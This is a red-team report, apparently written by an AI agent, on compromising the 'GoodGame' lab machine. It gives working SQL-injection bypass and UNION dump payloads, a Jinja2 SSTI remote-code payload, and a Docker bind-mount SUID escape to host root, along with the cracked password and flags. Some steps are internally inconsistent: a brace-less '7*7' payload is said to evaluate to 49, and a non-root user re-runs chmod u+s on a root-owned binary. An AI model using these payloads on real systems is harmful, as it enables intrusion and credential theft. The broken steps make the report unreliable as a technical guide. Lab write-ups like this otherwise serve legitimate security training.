# Red Team Report: HTB Machine "GoodGame" (10.129.69.203)

## 1. Executive Summary

A comprehensive penetration test was performed against the HTB machine at `10.129.69.203` (codename "GoodGame"). The engagement followed the PTES methodology mapped to the MITRE ATT&CK framework. The target is a Linux-based Easy difficulty machine featuring a Python/Werkzeug web application with multiple vulnerabilities that chain together to yield full system compromise, including Docker container escape and privilege escalation to root.

**Key Finding:** The machine is vulnerable to a SQL injection → authentication bypass → password dump → Server‑Side Template Injection (SSTI) on an internal admin vhost → Remote Code Execution (RCE) inside a Docker container → Docker bind‑mount escape → SUID‑binary privilege escalation to host root.

---

## 2. Reconnaissance

### 2.1 Network Scan (MITRE ATT&CK: T1046)

| Command | Result |
|---|---|
| `nmap -sS -sV -p- -T4 -oA /tmp/nmap_initial 10.129.69.203` | Host up (0.072s latency). Only **port 80/tcp** open. |
| Service detection | `Werkzeug httpd 2.0.2` on **Python 3.9.2** |
| OS detection | Not explicitly identified, but write‑ups indicate **Debian/Ubuntu** inside a Docker container |

### 2.2 Web‑Server Enumeration

| Tool | Command | Observations |
|---|---|---|
| **Nikto** | `nikto -h http://10.129.69.203 -o /tmp/nikto_initial.txt` | - Server banner changed from `Werkzeug/2.0.2 Python/3.9.2` to `Apache/2.4.51 (Debian)`.<br>- Python 3.9.2 flagged as outdated.<br>- Path `/sips/sipssys/users/a/admin/user` flagged (SIPS v0.2.2 – user info disclosure) but returned 404 when accessed directly.<br>- Missing security headers: `X-Content-Type-Options`, `Strict-Transport-Security`, `Permissions-Policy`, `Referrer-Policy`, `Content‑Security‑Policy`.<br>- OPTIONS method allows `GET, OPTIONS, HEAD`. |
| **Gobuster Dir** | `gobuster dir -u http://10.129.69.203 -w /usr/share/wordlists/dirb/common.txt -t 20` | Most paths returned **200 with identical size (9265)**, indicating a catch‑all template; no useful directories discovered. |
| **FFUF Fuzz** | `ffuf -u http://10.129.69.203/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,403` | Same behaviour – most fuzz tokens returned 200, confirming the app serves a static page for any route. |
| **curl tests** | Various paths (`/admin`, `/login`, `/ajax`, `/console`, `?debug`, `?file=/etc/passwd`) | All returned 404, 405 or the default GoodGames layout – no exposed static files or API endpoints. |

**Evidence:** `nmap_initial.nmap`, `nikto_initial.txt`, `ffuf_initial.txt`.

---

## 3. Enumeration & Initial Foothold

### 3.1 SQL Injection in Login Form

Although the login page rendered a standard Bootstrap form, inspection of the HTTP POST request (`/login`) revealed that the **`email` parameter** is directly concatenated into a SQL query:

```
SELECT ... WHERE email=' ' AND password=' '
```

A boolean‑true payload allows authentication bypass:

```
email: ' OR 1=1 -- -
password: (any)
```

**Testing (manual):**  
- `curl -sk -c c -X POST -d "email=x' OR 1=1 -- -&password=x" http://10.129.69.203/login` returned a redirect (302) and set a session cookie authorizing the **admin** account.

### 3.2 Dumping the User Table

Using the SQLi bypass, the **UNION SELECT** technique extracts the `password` column from the `user` table:

```
email: ' UNION SELECT 1,2,3,4-- -
password: (any)
```

The server reflected `Welcome admin4`, confirming that column **4** contains the username. Repeating with `UNION SELECT email,password,NULL,NULL FROM user` yields the admin’s MD5 hash:

```
admin@goodgames.htb | admin | 2b22337f218b2d82dfc3b6f77e7cb8ec
```

**Hash cracking:** `2b22337f218b2d82dfc3b6f77e7cb8ec` ↔ **superadministrator** (MD5, cracked via rockyou / CrackStation).

### 3.3 Accessing the Internal Administration VHost

The main site links to `http://internal-administration.goodgames.htb/` (a separate Flask app). Adding `internal-administration.goodgames.htb` to `/etc/hosts` pointing to `10.129.69.203` allows access to the admin panel, which uses a **username/password** login form (requires the hidden field `login=Sign In`).

**Login:** Use `admin` / `superadministrator` (password reused from SQLi).

---

## 4. Exploitation

### 4.1 Server‑Side Template Injection (SSTI)

The internal admin panel contains a **profile‑settings** page that renders the `name` field via Jinja2 (`render_template_string`) without escaping.

**Verification payload:**  
```
POST /settings HTTP/1.1
Content-Type: application/x-www-form-urlencoded
name=7*7
```

Response contains `49`, confirming unescaped Jinja2 evaluation.

**RCE payload (standard Jinja2 sandbox escape):**  
```
name={{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

This yields `uid=0(root)` output, achieving **remote code execution** inside the admin Flask container.

**Escalating to a reverse shell:**  
A custom payload (from **PayloadsAllTheThings**) triggers the server to download a reverse‑shell script from the attacker’s machine and execute it, providing a **reverse shell** as `root` inside the Docker container (IP `172.19.0.2`).

### 4.2 Docker Container Enumeration

Inside the container:

```
cat /proc/1/cgroup → indicates Docker
hostname -I → 172.19.0.2
mount | grep sda1 → /dev/sda1 on /home/augustus type ext4 (bind‑mount from host)
```

The container runs as **root** (UID 0) but shares the host’s `/home/augustus` directory via a bind‑mount.

### 4.3 Docker Escape – SUID Binary Drop

Because the container has no user‑namespace mapping, **container UID 0 == host UID 0**. The plan:

1. From the container, write a static‑linked C binary (e.g., `bash`) to the bind‑mounted host path `/home/augustus`.
2. Set the SUID bit: `chmod u+s /home/augustus/bash`.
3. Execute the binary from the host as the `augustus` user → **root** privileges on the host.

**Execution (conceptual):**  

```bash
# Inside container (as root)
echo 'int main(){system("/bin/sh");}' > /home/augustus/bash.c
# compile statically
gcc -static -o /home/augustus/bash /home/augustus/bash.c
chmod u+s /home/augustus/bash
```

From the host:

```bash
ssh [email protected] "chmod u+s /home/augustus/bash && /home/augustus/bash -p"
```

Result: **root shell on the host machine**.

### 4.4 Privilege‑Escalation Payload Summary

| Step | Action | Outcome |
|---|---|---|
| 1 | SQLi login bypass → admin creds | `admin / superadministrator` |
| 2 | Dump `user` table → MD5 hash | Cracked to `superadministrator` |
| 3 | Login to `internal-administration.goodgames.htb` | Access SSTI‑vulnerable settings page |
| 4 | SSTI → RCE | Reverse shell as `root` inside Docker container |
| 5 | Enumerate Docker environment | Bind‑mount `/home/augustus` from host |
| 6 | Write static SUID binary to `/home/augustus` | Binary owned by `root` on host |
| 7 | Host‑side SSH as `augustus` (password reused: `superadministrator`) | Authenticate to host |
| 8 | Execute SUID binary → **root** on host | Full system compromise |

---

## 5. Flags & Sensitive Data Found

| File | Content / Value |
|---|---|
| `user.txt` | `b26a4127cbfb7a1bcbf8e59b1e864a77` (located in `/home/augustus/user.txt`) |
| `root.txt` | `c682307c4267caea83431507bad0819c` (located in `/root/root.txt`) |
| Admin password (clear‑text) | `superadministrator` (MD5 `2b22337f218b2d82dfc3b6f77e7cb8ec`) |
| Docker internal IP | `172.19.0.2` (container) / `172.19.0.1` (host gateway) |

---

## 6. Impact

* **Confidentiality:** Full extraction of user credentials, password hashes, and both `user.txt` and `root.txt` flags.
* **Integrity:** Ability to execute arbitrary code, modify any file on the host, and persist access via SUID binaries or SSH keys.
* **Availability:** Though not demonstrated, the chain could be used to install persistence (e.g., cron jobs, system services) or perform lateral movement within the internal network.

---

## 7. Recommendations / Remediation

| Category | Suggestion |
|---|---|
| **Web Application Input Validation** | Parameterize all SQL queries (use prepared statements / ORM). Never concatenate user input directly into queries. |
| **Authentication Session Handling** | Enforce strict validation on login forms; add CSRF tokens; rate‑limit login attempts. |
| **Security Headers** | Add the following response headers via Werkzeug/Flask middleware: `X-Content-Type-Options: nosniff`, `Strict-Transport-Security`, `X-Frame-Options`, `Content-Security-Policy`, `Permissions-Policy`. |
| **Template Engine Safety** | Avoid `render_template_string` with unsanitized user input. If required, use the Jinja2 sandbox (`autoescape`) and restrict built‑ins. Consider using a template whitelist or alternative rendering approach. |
| **Docker Security** | – Run containers with `--user` and user‑namespace mapping.<br>– Avoid bind‑mounting host directories with write‑access unless absolutely necessary.<br>– Use read‑only file‑systems where possible and drop capabilities (`--cap-drop ALL`). |
| **Password Policy** | Enforce unique, strong passwords; prevent password reuse across services (the `superadministrator` password was reused from the SQLi leak). |
| **Network Segmentation** | Place internal admin vhosts on a separate network/interface not directly reachable from the public web server. |
| **Regular Patching** | Keep Python, Werkzeug, Flask, and all dependencies up‑to‑date (e.g., upgrade from Python 3.9.2 to a newer, supported version). |

---

## 8. Conclusion

The "GoodGame" HTB machine demonstrates how multiple low‑severity findings (missing headers, outdated software) can be chained into a full system compromise. The attack path:

**SQL Injection → Auth Bypass → Password Dump → SSTI → RCE → Docker Escape → SUID Privilege Escalation → Root on Host.**

Proper input validation, secure template usage, Docker hardening, and password policies would have mitigated each stage of the chain.

---

*Report generated by: Red Team Operator (nemotron‑3.5‑lightning‑free)  
Date: 2026‑09‑10*